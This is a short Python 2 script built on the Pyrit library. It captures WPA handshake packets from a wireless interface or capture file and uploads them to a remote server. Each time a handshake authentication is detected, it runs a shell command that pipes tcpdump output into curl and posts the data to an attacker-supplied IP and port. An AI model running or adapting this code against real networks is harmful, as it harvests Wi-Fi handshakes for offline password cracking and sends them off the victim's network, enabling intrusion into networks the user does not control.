import cpyrit.pckttools
import subprocess
import os

import argparse
import sys
import tempfile

## TODO: upload ccmp encrypted packets
## TODO: pyrit reports the same auth multiple times, avoid it (debounce)
## TODO: upload only the relevant packets (those of the specific ap)
## TODO: use native python (httplib, urllib, libpcap) instead of Popen/tcpdump/curl

class StripLoad(object):
    def __init__(self, outfile, server):
        self._outfile = outfile
        self._server = server
        self._writer = cpyrit.pckttools.Dot11PacketWriter(outfile)
        self._parser = cpyrit.pckttools.PacketParser()

        self._parser.new_ap_callback = self._new_ap_callback
        self._parser.new_keypckt_callback = self._new_keypckt_callback
        self._parser.new_auth_callback = self._new_auth_callback

        self._pckt_rdr = cpyrit.pckttools.PcapDevice(use_bpf=True)

    def _new_ap_callback(self, ap):
        self._writer.write(ap.essidframe)

    def _new_keypckt_callback(self, (_sta, _idx, pckt)):
        self._writer.write(pckt)

    def _new_auth_callback(self, (sta, auth)):
        upload = subprocess.Popen("/usr/sbin/tcpdump -r " + self._outfile + " | /usr/bin/curl --form upfile=@- http://" + "%s:%d" % self._server, stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT, shell=True)

    def start(self, capturefile):
        try:
            self._pckt_rdr.open_offline(capturefile)
        except IOError, offline_error:
            self._pckt_rdr.open_live(capturefile)
        self._parser.parse_pcapdevice(self._pckt_rdr)


def main(args):
    parser = argparse.ArgumentParser()
    parser.add_argument("capfile", metavar="interface_or_capfile")
    parser.add_argument("server_ip", type=str)
    parser.add_argument("server_port", type=int)
    parsed = parser.parse_args(args[1:])

    temp = tempfile.NamedTemporaryFile()
    StripLoad(temp.name, (parsed.server_ip, parsed.server_port)).start(parsed.capfile)

if __name__ == "__main__":
    sys.exit(main(sys.argv))
